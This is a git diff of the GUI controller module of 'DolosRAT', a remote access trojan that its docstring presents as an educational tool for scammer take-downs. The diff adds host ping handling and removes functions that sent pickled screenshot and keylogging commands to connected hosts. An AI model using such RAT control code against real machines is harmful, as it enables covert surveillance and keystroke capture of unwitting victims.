@@ -5,6 +5,7 @@
 # Created Date: 24/06/2023
 # version ='1.0'
 # ---------------------------------------------------------------------------
+# pylint: disable=import-error, syntax-error
 """
 DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
 techniques frequently used within scammer take-down operations. Please note that
@@ -12,30 +13,20 @@ the use of this tool is for educational purposes only.
 """
 
 # Built-in/Generic Imports.
-import sys
+from io import BytesIO
 from enum import Enum, auto
 from operator import attrgetter
 from time import sleep
-from typing import List
-from tkinter import PhotoImage
-
-import ast
-
-import inspect
-from importlib import util, import_module
-
-import __main__
+from typing import Any, List
+from ipaddress import IPv4Address
 
 # Modules.
-from config.network import network_conf # pylint: disable=import-error
-# from commands.command import Command # pylint: disable=import-error
-# import commands.window  # pylint: disable=import-error
-# from commands.window import ScreenshotCommand # pylint: disable=import-error
-from utils.misc.encoder import Pickle # pylint: disable=import-error
-from utils.misc.threading import threadpooled # pylint: disable=import-error
-from utils.net.capture import get_ipv4_capture # pylint: disable=import-error
-from utils.net.interface import IfaWrapper, IPv4Host # pylint: disable=import-error
-from utils.net.server import get_tcp_server_wrapper # pylint: disable=import-error
+from config.network import network_conf
+from utils.misc.threading import threadpooled
+from utils.net.capture import get_ipv4_capture
+from utils.net.icmp import get_ping_wrapper
+from utils.net.interface import IfaWrapper, IPv4Host
+from utils.net.server import get_tcp_server_wrapper
 
 host_status_poll_started: bool = False
 
@@ -114,7 +105,7 @@ def _set_host_status(top_level: object, host: IPv4Host, status: HostStatus = 1) 
 
     # Check status value and set replacement
     # string accordingly.
-    match status: # pylint: disable=syntax-error
+    match status:
         # 'Listening'
         case 0:
             # Set string to '[Listening]'
@@ -128,15 +119,37 @@ def _set_host_status(top_level: object, host: IPv4Host, status: HostStatus = 1) 
                 
     # Remove '[Disconnected]' string and
     # append '[Connected]'.
-    top_level.top_col_frame_3.edit_item(
+    top_level.top_col_frame_3.edit_item_connected(
         host_btn_text,
-        host_btn_text.replace(
-            '[Disconnected]', ''
-        ).replace(
-            '[Connected]', ''
-        ).replace(
-            '[Listening]', ''
-         ) + replacement_str
+        replacement_str
+    )
+
+def _set_host_ping(
+    top_level: object,
+    host_addr: IPv4Address,
+    host_port: int,
+    time_delta: int
+) -> None:
+    """_summary_
+
+    Args:
+        top_level (object): _description_
+    """
+    
+    # Replacement time delta.
+    # replacement_str = ' '
+    
+    # Get text of relevant host listbox item.
+    host_btn_text = \
+        top_level.top_col_frame_3.get_item_text(
+            f'{ host_addr }:{ host_port } '
+        )
+        
+    # Remove [<time-delta>ms] and replace with
+    # [<new-time-delta>ms]
+    top_level.top_col_frame_3.edit_item_ping(
+        host_btn_text,
+        time_delta
     )
 
 @threadpooled
@@ -275,6 +288,12 @@ def btn_listen(top_level: object) -> None:
     """_summary_
     """
 
+    host_addr, host_port = attrgetter(
+        'ipv4_addr', 'port'
+    )(network_conf.conf['selected_host'])
+
+    IfaWrapper.edit_host(host_addr, host_port, 'disconnected', False)
+
     # Initialise TCPServerWrapper and
     # commence listening for selected host.
     get_tcp_server_wrapper().run()
@@ -293,48 +312,31 @@ def btn_disconnect(top_level: object) -> None:
         'ipv4_addr', 'port'
     )(network_conf.conf['selected_host'])
     
-    IfaWrapper.edit_host(host_addr, host_port, 'connected', False)
+    IfaWrapper.edit_host(host_addr, host_port, 'disconnected', True)
     
     if not host_status_poll_started:
         _check_all_hosts_connected(top_level)
     
-def _send_command(top_level: object, command_str: str) -> None:
-    """_summary_
-    """
-    
-    host_addr, host_port = attrgetter(
-        'ipv4_addr', 'port'
-    )(network_conf.conf['selected_host'])
-    
-    pickled_command = Pickle.enc(network_conf.conf['commands'][command_str]())
-
-    IfaWrapper.edit_host(host_addr, host_port, 'command', pickled_command)
-    IfaWrapper.edit_host(host_addr, host_port, 'command_name', command_str)
-    
-    if command_output := IfaWrapper.get_host_attribute(host_addr, host_port, 'command_out'):
-        match IfaWrapper.get_host_attribute(host_addr, host_port, 'command_name'):
-            case 'ScreenshotCommand':
-                top_level.bottom_col_frame.frame_2.insert_img(command_output)
-            case 'KeystrokeLogCommand': 
-                ...
-            case _:
-                pass
-
-def btn_send_command_screenshot(top_level: object) -> None:
-    """_summary_
-    """
-    
-    _send_command(top_level, 'ScreenshotCommand')
-
-    top_level.bottom_col_frame.set('Natural View')
-
-def btn_send_command_keylog(top_level: object) -> None:
+@threadpooled
+def btn_ping(top_level: object) -> None:
     """_summary_
 
     Args:
         top_level (object): _description_
     """
     
-    _send_command(top_level, 'KeystrokeLogCommand')
+    host_addr, host_port = attrgetter(
+        'ipv4_addr', 'port'
+    )(network_conf.conf['selected_host'])
+
+    # Initialise PingWrapper and call 'ping'
+    # function.
+    get_ping_wrapper().ping()
     
-    top_level.bottom_col_frame.set('Text View')
+    # Wait for ICMP timeout period, and extract time delta.
+    sleep(5)
+    
+    if time_delta := IfaWrapper.get_host_attribute(
+        host_addr, host_port, 'ping'
+    ):
+        _set_host_ping(top_level, host_addr, host_port, time_delta)
